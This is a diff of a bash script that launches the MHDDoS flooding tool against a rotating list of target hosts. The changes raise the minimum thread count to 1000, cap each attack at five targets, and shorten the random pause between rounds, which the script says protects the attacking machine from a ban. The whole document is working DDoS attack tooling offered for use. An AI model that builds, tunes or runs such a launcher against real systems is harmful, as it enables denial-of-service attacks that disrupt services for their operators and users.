@@ -23,9 +23,9 @@ proxy_interval="-p $proxy_interval"
 
 num_of_copies="${1:-1}"
 threads="${2:-1500}"
-if ((threads < 500));
+if ((threads < 1000));
 then
-	threads=500
+	threads=1000
 fi
 
 rpc="${3:-1000}"
@@ -94,17 +94,17 @@ do
 	
    	if (("$num_of_copies" == "all"));
 	then	
-		if ((list_size > 7)); # takes not more than 7 targets to one attack (to deffend your machine)
+		if ((list_size > 5)); # takes not more than 5 targets to one attack (to deffend your machine)
 		then
-			random_numbers=$(shuf -i 1-$list_size -n 7)
+			random_numbers=$(shuf -i 1-$list_size -n 5)
 		else
 			random_numbers=$(shuf -i 1-$list_size -n $list_size)
 		fi
 	elif ((num_of_copies > list_size));
 	then 
-		if ((list_size > 7)); # takes not more than 7 targets to one attack (to deffend your machine)
+		if ((list_size > 5)); # takes not more than 5 targets to one attack (to deffend your machine)
 		then
-			random_numbers=$(shuf -i 1-$list_size -n 7)
+			random_numbers=$(shuf -i 1-$list_size -n 5)
 		else
 			random_numbers=$(shuf -i 1-$list_size -n $list_size)
 		fi
@@ -145,7 +145,7 @@ do
    	sudo pkill -e -f ./start.py
    	echo -e "\n\033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 	
-   	no_ddos_sleep="$(shuf -i 2-7 -n 1)m"
+   	no_ddos_sleep="$(shuf -i 2-6 -n 1)m"
    	echo -e "\n\033[46mSleeping $no_ddos_sleep without DDoS to protect your machine from ban...\033[0m\n"
 	sleep $no_ddos_sleep
 	echo -e "\n\033[42mRESTARTING\033[0m\n"
